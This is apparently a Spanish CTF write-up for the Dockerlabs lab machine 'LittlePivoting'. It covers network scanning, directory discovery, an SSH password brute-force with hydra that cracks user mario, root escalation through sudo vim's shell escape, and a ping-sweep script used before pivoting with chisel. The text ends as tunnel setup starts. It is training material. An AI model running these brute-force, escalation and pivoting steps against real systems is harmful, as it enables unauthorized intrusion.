# LittlePivoting

Máquina vulnerable en modo **medium** de Dockerlabs.

---

## 🔎 Reconocimiento

Las máquinas objetivo se encuentran correctamente desplegadas dentro de la red de laboratorio (en este caso, utilizando Docker).

![Reconocimiento](https://i.imgur.com/mgJb6qY.png)

![Reconocimiento](https://i.imgur.com/XcNbbPV.png)

Se utilizó el comando `arp-scan` utilizando la interfaz generada por docker para identificar los dispositivos conectados a la red de manera local. Dando como resultado una máquina disponible, con la ip `10.10.10.2`

```bash
> sudo arp-scan -I br-dcb58c6fa435 --localnet
Interface: br-dcb58c6fa435, type: EN10MB, MAC: 02:42:f4:9f:36:7b, IPv4: 10.10.10.1
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.2	02:42:0a:0a:0a:02	(Unknown: locally administered)

1 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.966 seconds (130.21 hosts/sec). 1 responded
```

---

## 📡 Escaneo ***trus*t**

Se realizó un escaneo con **Nmap** para identificar puertos abiertos y servicios en la **maquina trust**:

```bash
nmap -p- --open -sC -sV --min-rate 5000 -n -Pn 10.10.10.2
```

Resultados principales:

```
# Nmap scan report for 10.10.10.2
Host is up (0.0000090s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 19:a1:1a:42:fa:3a:9d:9a:0f:ea:91:7f:7e:db:a3:c7 (ECDSA)
|_  256 a6:fd:cf:45:a6:95:05:2c:58:10:73:8d:39:57:2b:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 02:42:0A:0A:0A:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.68 seconds
```

---

## 📂 Enumeración **_trust_**

Se hizo una inspección del sitio web en el puerto **80** y se identificó un servidor apache en el index, se procedió a realizar un discovery de directorios con gobuster.

```bash
gobuster dir -u "http://10.10.10.2"   -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt   -t 20 -x php,txt,html,php.bak
```

```
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.2
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,html,php.bak,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html          [32m (Status: 200)[0m [Size: 10701]
/secret.php          [32m (Status: 200)[0m [Size: 927]
/server-status       [33m (Status: 403)[0m [Size: 275]
Progress: 1102785 / 1102785 (100.00%)
===============================================================
Finished
===============================================================

```

La única página que pareció tener información relevante fue la de `secret.php` el cual arrojó datos de un posible usuario llamado **mario**

![Scan1](https://i.imgur.com/zwXv23k.png)

Al no encontrar otra información que se considerara relevante, se procedió a realizar un ataque de brute force con **hydra** al ssh usando el usuario mario y los resultados fueron positivos.

```bash
> hydra -t 4 -l mario -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-06 11:21:58
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://10.10.10.2:22/
[22][ssh] host: 10.10.10.2   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-06 11:22:23
```

---

## 💥 Explotación **_trust_**

Con las credenciales obtenidas se realiza el proceso de explotación ingresando a la terminal por medio del puerto abierto con ssh, el resultado fue el siguiente:

![Werkzeug1](https://i.imgur.com/BxtqCua.png)

---

## 🔝 Escalación de privilegios **_trust_**

Se analizó el entorno para validar cómo conseguir la escalada de privilegios. Por lo que se buscaron binarios con permisos SUID:

```bash
find / -perm -4000 2>/dev/null
```

![SUID](https://i.imgur.com/grvujc8.png)

Al tener disponible `/usr/bin/vim` para ejecutar con sudo, se revisó [GTFObins](https://gtfobins.github.io/gtfobins/vim/) para escalar privilegios con este binario y por medio del comando `:!/bin/sh` se puede alcanzar el root.

![SUID](https://i.imgur.com/kttYaL3.png)

Al obtener el usuario root, lo siguiente fue hacer un recon con `hostname -I` para identificar los host disponibles dentro de la red y el resultado fue:

```bash
hostname -I
10.10.10.2 20.20.20.2
```

Se desarrolló un pequeño script en base a un análisis básico de hosts pasando tres optetos como base y se mandó a la máquina trust para ejecutar el reconocimiento al igual que **chisel** el cual es una herramienta de tunelización para establecer la comunicación entre máquinas el cuál puede ser revisado desde [aquí](https://github.com/jpillora/chisel).

### **hostScanner.sh:**

```bash
#!/bin/bash

if [ -z "$1" ]; then
	echo "Use: $0 <prefix>"
	echo "Sample: $0 20.20.20"
fi

PREFIX=$1

for host in $(seq 1 200); do
	timeout 1 bash -c "ping -c 1 ${PREFIX}.$host &>/dev/null" \ && echo "\U0001f43e HOST FOUND - ${PREFIX}.$host"
done
wait

```

![SUID](https://i.imgur.com/7v8BUdK.png)

Desde aquí hubo un pequeño problema de **_command not found_** al ejecutar en bash el `ping` por lo que con una simple instalación sudo apt install iputils-ping o `sudo apt install iputils-ping` o `sudo apt install inetutils-ping` solucionó el problema, luego se ejecutó el hostScanner y se encontraron los siguientes hosts al alcance:

![SUID](https://i.imgur.com/MN4R7hG.png)

#### Crear tunel (**trust** -> **kali**)

Al haber identificado una segunda máquina dentro de los hosts de la máquina **_trust_** se creó un tunel que nos permita alcanzar esa segunda máquina desde la atacante.
